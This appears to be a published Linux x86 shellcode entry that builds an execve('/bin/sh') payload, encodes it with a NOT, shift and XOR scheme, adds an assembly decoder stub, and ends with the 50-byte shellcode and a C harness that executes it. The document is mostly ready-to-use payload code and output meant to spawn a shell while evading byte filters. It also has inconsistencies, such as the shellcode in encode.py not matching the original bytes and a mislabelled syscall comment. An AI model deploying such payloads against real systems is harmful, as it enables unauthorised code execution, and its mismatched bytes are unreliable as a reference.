/*
# Title: Linux\x86 (NOT +SHIFT-N+ XOR-N) + encoded (/bin/sh) Shellcode (50 byes)
# Author: Pedro Cabral
# Purpose: spawn /bin/sh shell
# Tested On: Ubuntu 16.04.01 LTS
# Arch: x86
# Size: 50 bytes

##################################### sh.asm ######################################

global _start

section .text
_start:

	xor eax, eax	; reseting the register
	push eax	; pushing null terminator
	push 0x68732f2f	; push /bin//sh
	push 0x6e69622f
	mov ebx, esp	; ebx = /bin//sh
	push eax
	mov edx, esp	; envp = 0
	push ebx
	mov ecx, esp	; argv = [filename,0]
	mov al, 11	; syscall 12 (execve)
	int 0x80	; syscall

############################# original shellcode ####################################

pedro@ubuntu:~$ nasm -f elf32 sh.asm
pedro@ubuntu:~$ ld -N -o sh sh.o
pedro@ubuntu:~$ echo;objdump -d ./sh|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g';echo

"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

#################################  encode.py  #####################################

#!/usr/bin/python

import sys

if len(sys.argv) != 3:
        print "Usage : python encode.py <SHIFT number> <XOR number>"
        sys.exit(0)

shift   = int(sys.argv[1])
xor     = int(sys.argv[2])

#shellcode = (
#"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\"
#"xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

shellcode = ("\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# addition to the inicial of the shellcode the SHIFT and XOR values
encoded_shellcode =""
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %shift
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %xor

# [NOT + SHL-N + XOR-N] encoded shellcode
for i in bytearray(shellcode):
	new = ~i & 0xff
	new = new << shift
        new = new ^ xor
        encoded_shellcode += '0x'
        encoded_shellcode += '%02x, ' %new

# end of shellcode
encoded_shellcode += '0x'
encoded_shellcode += '%02x, ' %xor

# print encoded shellcode
print encoded_shellcode

#################################### Encoded Shellcode  ##########################################

pedro@ubuntu:~$ python encode.py 4 1337
0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539,

#################################### decoder.asm  ###############################################

global _start

section .text

_start:

jmp short enc

decoder:
xor ecx,ecx
mul ecx

pop esi
mov cx,[esi]
inc esi
inc esi
mov bx, [esi]
inc esi
inc esi

push esi
mov edi, esi
main:

mov ax,[esi]
xor ax, bx
jz call_decoded
shr ax, cl
not word ax
mov [edi], al
inc esi
inc esi
inc edi
jmp short main

call_decoded:
call [esp]

enc:
call decoder
encoded: dw 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539

######################################### final shellcode ###########################################

pedro@ubuntu:~/encoded$ nasm -f elf32 decoder.asm
pedro@ubuntu:~/encoded$ ld -o decoder decoder.o
pedro@ubuntu:~/encoded$ echo;objdump -d ./decoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g';echo

"\xeb\x2a\x31\xc9\xf7\xe1\x5e\x66\x8b\x0e\x46\x46\x66\x8b\x1e\x46\x46\x56\x89\xf7\x66\x8b\x06\x66\x31\xd8\x74\x0d\x66\xd3\xe8\x66\xf7\xd0\x88\x07\x46\x46\x47\xeb\xeb\xff\x14\x24\xe8\xd1\xff\xff\xff\x04\x00\x39\x05\xd9\x09\xc9\x06\xc9\x0f\x49\x0c\x29\x0c\x39\x08\xf9\x0d\x49\x0c\x49\x0c\x39\x08\x39\x08\xe9\x0c\x59\x0c\x59\x02\xf9\x04\xc9\x0f\x59\x02\xe9\x04\xf9\x0f\x59\x02\xd9\x04\xc9\x01\x79\x0a\x19\x06\xc9\x02\x39\x05"


pedro@ubuntu:~/encoded$ gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
pedro@ubuntu:~/encoded$ ./shellcode
Shellcode Length:  50
$ whoami
pedro
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\xeb\x2a\x31\xc9\xf7\xe1\x5e\x66\x8b\x0e\x46\x46\x66\x8b\x1e\x46\x46\x56\x89\xf7\x66\x8b\x06\x66\x31\xd8\x74\x0d\x66\xd3\xe8\x66\xf7\xd0\x88\x07\x46\x46\x47\xeb\xeb\xff\x14\x24\xe8\xd1\xff\xff\xff\x04\x00\x39\x05\xd9\x09\xc9\x06\xc9\x0f\x49\x0c\x29\x0c\x39\x08\xf9\x0d\x49\x0c\x49\x0c\x39\x08\x39\x08\xe9\x0c\x59\x0c\x59\x02\xf9\x04\xc9\x0f\x59\x02\xe9\x04\xf9\x0f\x59\x02\xd9\x04\xc9\x01\x79\x0a\x19\x06\xc9\x02\x39\x05";


void main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}